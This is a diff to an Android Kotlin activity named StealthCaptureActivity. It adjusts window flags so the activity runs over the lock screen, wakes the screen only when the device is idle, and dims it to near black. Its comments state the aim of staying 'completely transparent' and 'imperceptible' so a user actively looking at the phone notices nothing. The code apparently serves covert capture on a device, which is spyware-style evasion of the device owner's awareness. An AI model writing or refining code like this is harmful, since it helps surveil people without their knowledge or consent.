@@ -101,24 +101,33 @@ class StealthCaptureActivity : AppCompatActivity() {
 
     private fun configureWindow() {
         try {
-            // Use setShowWhenLocked and setTurnScreenOn so Activity moves to RESUMED state on Android 14-16
+            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
+            val isInteractive = pm?.isInteractive ?: true
+
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                 setShowWhenLocked(true)
-                setTurnScreenOn(true)
+                if (!isInteractive) {
+                    setTurnScreenOn(true)
+                }
             }
 
             @Suppress("DEPRECATION")
             window.addFlags(
                 WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                 WindowManager.LayoutParams.FLAG_ALLOW_LOCK_WHILE_SCREEN_ON or
-                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
-                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
+                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
             )
 
-            // Dim screen to nearly black (imperceptible)
-            val lp = window.attributes
-            lp.screenBrightness = 0.01f
-            window.attributes = lp
+            // If the screen is off (standby), keep brightness minimal.
+            // If the device is interactive (user is actively looking at screen),
+            // do NOT touch screenBrightness and remain completely transparent so there is ZERO black screen.
+            if (!isInteractive) {
+                @Suppress("DEPRECATION")
+                window.addFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON)
+                val lp = window.attributes
+                lp.screenBrightness = 0.01f
+                window.attributes = lp
+            }
 
             // Dismiss keyguard if already unlocked
             val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
